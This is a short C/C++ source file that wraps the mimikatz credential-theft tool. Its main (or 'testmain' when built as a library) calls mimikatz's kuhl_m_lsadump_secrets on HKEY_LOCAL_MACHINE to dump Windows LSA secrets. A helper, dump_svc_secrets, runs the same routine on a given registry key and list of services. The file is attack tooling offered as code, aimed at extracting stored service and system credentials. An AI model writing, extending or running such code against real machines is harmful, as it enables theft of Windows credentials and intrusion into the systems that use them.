#include <stdio.h>
#include <string>

#include "mimikatz\kuhl_m_lsadump.h"

#ifdef MIMIKATZLIB
	#include "lsadumpsecrets.h"
#endif

#pragma comment(lib, "ntdll.min.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "cryptdll.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

#ifdef MIMIKATZLIB
int testmain(int argc, char** argv)
#else
int main(int argc, char** argv)
#endif
{
	kuhl_m_lsadump_secrets( HKEY_LOCAL_MACHINE, nullptr, 0);
	return 0;
}

void dump_svc_secrets(HKEY passedKey, PSVC_STRUCT *svc_arr, size_t svc_arr_size)
{
	kuhl_m_lsadump_secrets( passedKey, svc_arr, svc_arr_size );
}